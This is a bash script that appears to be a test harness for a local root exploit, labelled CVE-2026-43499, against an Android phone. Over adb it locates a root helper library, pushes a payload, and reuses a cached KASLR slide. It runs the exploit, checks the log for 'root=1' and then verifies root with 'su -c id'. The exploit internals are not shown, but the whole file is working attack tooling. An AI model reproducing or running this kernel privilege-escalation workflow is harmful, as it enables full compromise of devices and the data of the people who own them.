#!/bin/bash
# On-device test harness for CVE-2026-43499 exploit with waiter-layout fix
# Usage: ./test_on_device.sh

set -e

PKG="dev.busung.s25uroot"
HELPER_PATH=""
PAYLOAD_LOCAL="build/q7mq-F968NKSS6BZG3/cve-2026-43499-app.so"
PAYLOAD_DEVICE="/data/local/tmp/payload_test.so"
LOG_DEVICE="/data/local/tmp/exploit_test.log"

echo "=== CVE-2026-43499 On-Device Test Harness ==="
echo ""

# Check device
echo "[1] Checking ADB device..."
if ! adb devices | grep -q "device$"; then
    echo "ERROR: No ADB device connected"
    exit 1
fi
echo "Device: $(adb shell getprop ro.product.model)"
echo ""

# Find helper binary
echo "[2] Locating helper binary..."
HELPER_PATH=$(adb shell "find /data/app -name 'libcve43499root.so' 2>/dev/null | head -1" | tr -d '\r')
if [ -z "$HELPER_PATH" ]; then
    echo "ERROR: Helper binary not found"
    exit 1
fi
echo "Helper: $HELPER_PATH"
echo ""

# Push payload
echo "[3] Pushing test payload..."
adb push "$PAYLOAD_LOCAL" "$PAYLOAD_DEVICE"
echo ""

# Get boot_id for slide cache
echo "[4] Reading boot_id..."
BOOT_ID=$(adb shell cat /proc/sys/kernel/random/boot_id | tr -d '\r')
echo "boot_id: $BOOT_ID"
echo ""

# Check cached slide
echo "[5] Checking cached KASLR slide..."
SLIDE=$(adb shell "run-as $PKG cat shared_prefs/p0_cache.xml 2>/dev/null | grep -o '0x[0-9a-fA-F]*' | head -1" | tr -d '\r')
if [ -n "$SLIDE" ]; then
    echo "Cached slide: $SLIDE"
else
    echo "No cached slide (will scan)"
fi
echo ""

# Kill any orphaned processes
echo "[6] Cleaning up orphaned processes..."
adb shell "pkill -f libcve43499root || true"
sleep 1
echo ""

# Run exploit
echo "[7] Running exploit..."
echo "Command: $HELPER_PATH --run-payload $PAYLOAD_DEVICE $HELPER_PATH $LOG_DEVICE"
echo ""
echo "--- Exploit output ---"
adb shell "SLIDE_P0_OFFSET=$SLIDE $HELPER_PATH --run-payload $PAYLOAD_DEVICE $HELPER_PATH $LOG_DEVICE" 2>&1 || true
echo "--- End output ---"
echo ""

# Pull log
echo "[8] Pulling exploit log..."
adb pull "$LOG_DEVICE" /tmp/exploit_test_result.log 2>/dev/null || true
echo ""

# Check results
echo "[9] Checking results..."
if grep -q "done=1 root=1" /tmp/exploit_test_result.log 2>/dev/null; then
    echo "SUCCESS: Root achieved!"
    echo ""
    echo "Verifying root access..."
    adb shell "su -c id" 2>&1 || echo "su command failed (daemon may need restart)"
else
    echo "Exploit did not complete successfully"
    echo ""
    echo "Last 50 lines of log:"
    tail -50 /tmp/exploit_test_result.log 2>/dev/null || echo "No log available"
fi

echo ""
echo "=== Test complete ==="
